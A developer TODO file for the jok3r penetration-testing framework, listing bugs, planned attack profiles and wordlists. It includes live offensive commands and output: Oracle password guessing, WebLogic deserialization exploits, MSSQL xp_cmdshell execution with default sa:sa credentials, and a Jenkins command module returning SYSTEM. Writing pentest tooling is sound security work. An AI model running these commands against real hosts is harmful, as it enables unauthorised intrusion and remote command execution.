=====
TODO
=====


Docker Environment
==================
* IMPORTANT: RE INSTALL odat !! 
* re-install impacket



BUG FIXES
===============================================================================

- db > service -S -> recherche par url semble pas marcher
- db > services - ip ranges selection bug





IMPROVEMENTS / NEW FEATURES
===============================================================================
- Ctrl+C -> add possibility to switch fast mode on/off

- AttackProfiles:
    - weak-creds (weak, common, default)
        http -> changeme, htaccess bruteforce quick with common creds admin:admin, admin:password...
        mssql -> msdat passwordguesser sa:sa sa:
        oracle -> tnscmd pour sid, odat passwordguesser avec sid
        ajp -> ajp bf
        ...

    - advanced-creds-bruteforce
        (include weak-creds checks)

    - fast-scan
    - vuln-lookup-banner (require banner grabbing enabled or banner already retrieved in imported nmap scan)

    - web-scan-appserver
    - web-scan-cms
    - web-discovery
    - web-discovery-fast


- discovery-* checks:
    - appserver-wordlist
    - cms-wordlist
    - language-wordlist (per language => lots of work to produce wordlists for each language + add generic ie HTML, XML, LOG, TXT...)
    - general-minimal-wordlist
    - general-wordlist (raft directory)

- Auth types:
    - supported auth-type => only type that support various status/lvl (can be added in cmdline)
    - can accept other values (eg creds trouvés par changeme) and can be displayed in db>creds
    - method for creds retrieval in postrun

* Reporting HTML:
    * Template https://www.jqueryscript.net/menu/Bootstrap-Sidebar-Extension-With-jQuery-CSS-CSS3.html
    * https://www.jqueryscript.net/demo/Bootstrap-Sidebar-Extension-With-jQuery-CSS-CSS3/
    * http://www.finalhints.com/live-search-in-html-table-using-jquery/
    * At the end, prompt to open in browser like in eyewitness

* Do not re-run checks already done

* Nmap import: filter on nmap results to add

* Improve wordlist quality:
    * passwords
    * wordlist per language
    * wordlist per cms
    * wordlist per server
    * web files/directories:
        * https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content
        * https://github.com/xajkep/wordlists
        * https://www.netsparker.com/blog/web-security/svn-digger-better-lists-for-forced-browsing/
        * Administration: https://github.com/fnk0c/cangibrina/tree/master/wordlists





SMART MODULES / REGEXP
===============================================================================

* - ftp update smart, add anonymous creds when nmap detect + context req sur bruteforce:
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack HP JetDirect ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_d-w--w--w-   2 JetDirect  public         512 Feb 14  1999 PORT1 [NSE: writeable]

* - add postrun tnscmd_sid
- add re.IGNORECASE tns sid
- add sid detection:
[+] Data received by the database server: ''\x00 \x00\x00\x02\x00\x00\x00\x016\x00\x01\x08\x00\x7f\xff\x00\x01\x01]\x00 \r\x08\x00\x00\x00\x00\x00\x00\x00\x00\x01g\x00\x00\x06\x00\x00\x00\x00\x00(DESCRIPTION=(TMP=)(VSNNUM=153093632)(ERR=0)(ALIAS=LISTENER)(SECURITY=OFF)(VERSION=TNSLSNR for IBM/AIX RISC System/6000: Version 9.2.0.6.0 - Production)(START_DATE=10-NOV-2018 17:56:38)(SIDNUM=1)(LOGFILE=/apps/oracle/9.2.0/network/log/listener.log)(PRMFILE=/apps/oracle/adm/network/listener.ora)(TRACING=off)(UPTIME=23928489)(SNMP=OFF)(PID=7995588))\x02Q\x00\x00\x06\x00\x00\x00\x00\x00(ENDPOINT=(HANDLER=(HANDLER_MAXLOAD=0)(HANDLER_LOAD=0)(ESTABLISHED=0)(REFUSED=0)(HANDLER_ID=7A5359F37007-00C4-E053-9F32E94200C4)(PRE=any)(SESSION=NS)(DESCRIPTION=(ADDRESS=(PROTOCOL=tcp)(HOST=parva7301586)(PORT=1521))))),,(SERVICE=(SERVICE_NAME=METHFRP1_DGMGRL.world)(INSTANCE=(INSTANCE_NAME=METHFRP1)(NUM=1)(INSTANCE_STATUS=UNKNOWN)(NUMREL=1))),,(SERVICE=(SERVICE_NAME=ROG2WDP0_DGMGRL.world)(INSTANCE=(INSTANCE_NAME=ROG2WDP0)(NUM=1)(INSTANCE_STATUS=UNKNOWN)(NUMREL=1))),,(SERVICE=(SERVICE_NAME=RSS0WDP1)(INSTANCE=(INSTANCE_NAME=RSS0WDP1)(NUM=1)(INSTANCE_STATUS=UNKNOWN)(NUMREL=1))),,''

- Check this case where sid=LISTENER ??

         cmd> python2.7 odat.py tnscmd -s 10.190.98.154 -p 1521 -d any --ping -v                                                                                                                               

        16:49:05 INFO -: alias list emptied
        16:49:05 INFO -: Data received thanks to the 'ping' cmd: '\x00A\x00\x00\x04\x00\x00\x00"\x00\x005(DESCRIPTION=(TMP=)(VSNNUM=0)(ERR=0)(ALIAS=LISTENER))'

        [1] (10.190.98.154:1521): Searching ALIAS on the 10.190.98.154 server, port 1521
        [+] 1 ALIAS received: ['LISTENER']. You should use this alias (more or less) as Oracle SID.

                                                                                                                                                                                                              


        [*] [SMART] Running post-check method "tnscmd_sid" ...
        [+] [SMART] New detected option: sid = LISTENER

        [?] Run command #02 ? [Y/n/t/w/q] q










CHECKS CORRECTIONS
===============================================================================


- samba-rce-cve2015-0240 only if os = *linux*

- Correct path ysoserial:
/jok3r/toolbox/http/exploit-weblogic-cve2017-3248# python2.7 exploits/weblogic/exploit-CVE-2017-3248-bobsecq.py -t 10.2.211.136 -p 443 --ssl --check --ysopath /root/jok3r/toolbox/multi/ysoserial/ysoserial-master.jar


- Mettre /bin/bash -c pour utilisation de <<< + single quote !! dans :
root@kali:~/jok3r/toolbox/http/exploit-weblogic-cve2018-2893# echo "[~] Will try to ping local IP = 10.250.58.108"; echo "[~] Running tcpdump in background..."; sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &" ; java -jar ysoserial-cve-2018-2893.jar JRMPClient4 "/bin/ping -c 4 10.250.58.108" > /tmp/poc4.ser; python2.7 weblogic.py 10.2.211.136 443 /tmp/poc4.ser; echo "[~] Wait a little bit..."; sleep 3; PID=$(ps -e | pgrep tcpdump); echo "[~] Kill tcpdump"; sudo kill -9 $PID; sleep 2; echo "[~] Captured ICMP traffic:"; echo; sudo tcpdump -r /tmp/dump.pcap; echo "[~] Delete capture"; sudo rm /tmp/dump.pcap; rm /tmp/poc4.ser

-ODAT: simple quote après /bin/bash !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! (sinon $var non prise en compte)
/bin/bash -c 'export ORACLE_HOME=`file /usr/lib/oracle/*/client64/ | tail -n 1 | cut -d":" -f1`; export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$ORACLE_HOME/lib; export PATH=$ORACLE_HOME/bin:$PATH; echo $ORACLE_HOME; python2.7 odat.py passwordguesser -s 10.2.208.173 -p 1521 -d LISTENER -vv --force-retry --accounts-file accounts/accounts_multiple.txt'


- dirsearch : -t 40 --timeout= (add --timeout to dirsearch)

- DOMI-OWNED  => fonctionne sur 5, 6 et v8

- bug dirhunt
    cmd> dirhunt https://www.correspondant-assurance.fr/bnppere                                                                                                                                           

    Traceback (most recent call last):
      File "/usr/local/bin/dirhunt", line 11, in <module>
        load_entry_point('dirhunt==0.5.1', 'console_scripts', 'dirhunt')()
      File "/usr/lib/python3/dist-packages/pkg_resources/__init__.py", line 484, in load_entry_point
        return get_distribution(dist).load_entry_point(group, name)
      File "/usr/lib/python3/dist-packages/pkg_resources/__init__.py", line 2707, in load_entry_point
        return ep.load()
      File "/usr/lib/python3/dist-packages/pkg_resources/__init__.py", line 2325, in load
        return self.resolve()
      File "/usr/lib/python3/dist-packages/pkg_resources/__init__.py", line 2331, in resolve
        module = __import__(self.module_name, fromlist=['__name__'], level=0)
      File "/usr/local/lib/python3.6/dist-packages/dirhunt-0.5.1-py3.6.egg/dirhunt/management.py", line 13, in <module>
        from dirhunt.crawler import Crawler
      File "/usr/local/lib/python3.6/dist-packages/dirhunt-0.5.1-py3.6.egg/dirhunt/crawler.py", line 16, in <module>
        from dirhunt.sessions import Sessions
      File "/usr/local/lib/python3.6/dist-packages/dirhunt-0.5.1-py3.6.egg/dirhunt/sessions.py", line 5, in <module>
        from proxy_db.models import Proxy
    ModuleNotFoundError: No module named 'proxy_db.models'


- ./optionsbleed -n 40 -a -u https://www.correspondant-epargne.fr/tpe 
No response , Normal ?

- add exploitations avec clusterd

- [check_mysql-interesting-tables-columns] add context


- Add option --webdir-wordlist for check discovery-general-wordlist 




CHECKS ADDING
===============================================================================


- Jenkins scripts:
Attention; TARGETURI / et /jenkins/

msf auxiliary(scanner/http/jenkins_command) > show options 

Module options (auxiliary/scanner/http/jenkins_command):


msf auxiliary(scanner/http/jenkins_command) > run

[+] [2018.11.19-14:37:28] 10.2.153.123:8080     nt authority\system
[*] [2018.11.19-14:37:28] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/http/jenkins_command) > 
msf auxiliary(scanner/http/jenkins_command) > 
msf auxiliary(scanner/http/jenkins_command) > set TARGETURI /jenkins/
TARGETURI => /jenkins/
msf auxiliary(scanner/http/jenkins_command) > run

[-] [2018.11.19-14:37:51] 10.2.153.123:8080     This system is not running Jenkins-CI at /jenkins/
[*] [2018.11.19-14:37:51] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/http/jenkins_command) > set TARGETURI /
TARGETURI => /

- Jenkins deserialize

- add exploit/linux/misc/jenkins_java_deserialize (attention: os linux)
- add exploit/windows/misc/ibm_websphere_java_deserialize (os win)
- add auxiliary/scanner/http/jenkins_login
- add exploit/windows/misc/ibm_websphere_java_deserialize
- add https://github.com/Coalfire-Research/java-deserialization-exploits (websphere rce, jenkins rce...)
- add exploit/multi/http/jenkins_script_console
- add msfmodules for different appservers.....
- RCE Tomcat CVE-2017-12617 /usr/share/exploitdb/exploits/jsp/webapps/42966.py
    WARNING: Add verify=False !
            if 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAA' in con:
                print bcolors.WARNING+url+' it\'s Vulnerable to CVE-2017-12617'+bcolors.ENDC
                print bcolors.WARNING+url+"/"+checker+bcolors.ENDC
                
        else:
            print 'Not Vulnerable to CVE-2017-12617 '



- ftp postexploit list dir

* Weblogic CVE-2018-2628 https://github.com/tdy218/ysoserial-cve-2018-2628
* https://github.com/chadillac/mdns_recon
* nfsshell (sudo apt-get install libreadline-dev ; make)
* https://github.com/hegusung/RPCScan.git
* https://www.magereport.com
* https://github.com/AlisamTechnology/PRESTA-modules-shell-exploit/blob/master/PRESTA-shell-exploit.pl
* https://github.com/breenmachine/JavaUnserializeExploits
* https://github.com/DanMcInerney/pentest-machine
* Sharepoint -> https://github.com/TestingPens/SPartan
* https://github.com/SecWiki/CMS-Hunter
* 

* Better exploit for MS17-010 (support for more win versions, only Win7 and 2008 R2 for now)

* For all bruteforce with 'auth_status': NO_AUTH -> create command with username known 

* cve jquery
* cve ssh
* ssh cve enul
* ssh libssh vuln
* vulners-lookup
* cvedetails-lookup
* wordlists per language
* jndiat
* check https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html
* correct start module http 
* Java-RMI -> handle case windows ping -n








- jok3r-script for oracle install:

  - change url + reinstall
  wget https://github.com/koutto/jok3r-scripts/raw/master/oracle/odat-dependencies/oracle-instantclient12.2-sqlplus_12.2.0.1.0-2_amd64.deb
wget https://github.com/koutto/jok3r-scripts/raw/master/oracle/odat-dependencies/oracle-instantclient18.3-basic_18.3.0.0.0-2_amd64.deb
wget https://github.com/koutto/jok3r-scripts/raw/master/oracle/odat-dependencies/oracle-instantclient18.3-devel_18.3.0.0.0-2_amd64.deb
sudo dpkg -i oracle-instantclient18.3-basic_18.3.0.0.0-2_amd64.deb
sudo dpkg -i oracle-instantclient12.2-sqlplus_12.2.0.1.0-2_amd64.deb

- add in dockerfile:

  export ORACLE_HOME=`file /usr/lib/oracle/*/client64/ | tail -n 1 | cut -d':' -f1`
  export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$ORACLE_HOME/lib
  export PATH=$ORACLE_HOME/bin:$PATH
  
 - autre bug:
17:17:05 DEBUG -: Try to connect with APPLYSYSPUB/<UNKNOWN>
17:17:05 DEBUG -: Oracle connection string: APPLYSYSPUB/<UNKNOWN>@10.190.98.115:1521/LISTENER
17:17:05 DEBUG -: Error during connection with this account: `ORA-12514: TNS:listener does not currently know of service requested in connect descriptor`
17:17:05 DEBUG -: Try to connect with APPS/APPS
17:17:05 DEBUG -: Oracle connection string: APPS/APPS@10.190.98.115:1521/LISTENER
=> correction:
/bin/bash -c "export ORACLE_HOME=`file /usr/lib/oracle/*/client64/ | tail -n 1 | cut -d':' -f1`; export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$ORACLE_HOME/lib; export PATH=$ORACLE_HOME/bin:$PATH; python2.7 odat.py passwordguesser -s 10.190.98.114 -p 1521 -d SCAN3 -vv --force-retry --accounts-file accounts/accounts_multiple.txt"


- More default creds for mssql
https://github.com/mubix/post-exploitation-wiki/blob/master/windows/mssql.md


- MSSQL - postexploit
/bin/bash -c 'python2.7 msdat.py all -s 10.244.214.126 -p 1433 -U sa -P sa -v <<< C'; 

- MSSQL postexploit add shell exec:
python2.7 msdat.py xpcmdshell -s 10.244.214.126 -p 1433 -U sa -P sa -v --enable-xpcmdshell
/bin/bash -c 'python2.7 msdat.py xpcmdshell -s 10.244.214.126 -p 1433 -U sa -P sa -v --shell <<< "whoami && net user"''

- IMPORTANT: encadrer par /bin/bash -c '...' pour toutes les cmds avec <<< any



Services to add
===============
* NFS
* MongoDB
* RPC
* DNS
* LDAP




Regexp todo:
OK- Domiowned
OK- Fingerprinter
removed- Cmsexplorer
OK- drupwn
OK- cmsmap
OK- wpseku
OK- wpscan
OK- joomscan
ras- joomlascan
- joomlavs
- droopescan
- xbruteforcer



SMARTMODULES / MATCHSTRINGS
===============================================================================
* impacket smbexec/wmiexec/psexec
* whatweb
* nikto -> too many junk to extract important issues i think
* davscan
* wpseku 
* vbscan
* barmie

drupwn





WORDLISTS ADDING
===============================================================================

- Idea for wordlist services creds: https://github.com/x90skysn3k/brutespray/tree/master/wordlist

- Very Minimalist dirs wordlists

root@kali:~/jok3r/toolbox/http/dirsearch# cat dirs_minimalist.txt 
account
accounts
adm
admin
_admin
Admin
ADMIN
admin2
adminarea
administrator
api
app
appli
application
applis
auth
back
backup
_backup
bak
cache
_cache
common
component
components
conf
config
configuration
control
controller
controllers
core
data
debug
dev
development
doc
docs
document
download
downloads
Downloads
en
error
file
files
Files
fr
ftp
help
html
image
images
img
inc
Inc
include
_include
includes
_includes
Includes
install
lib
manager
modules
old
page
pages
pdf
phpmyadmin
plugins
priv
_priv
_private
pub
public
_public
report
reports
require
script
scripts
secure
service
services
share
site
sites
sql
src
stat
stats
status
temp
Temp
template
templates
test
Test
test1
test2
testing
tests
tmp
tool
tools
tpl
update
updates
upload
uploads
Uploads
user
users
util
utils
webadmin
WEB-INF
www
xml
xmlrpc

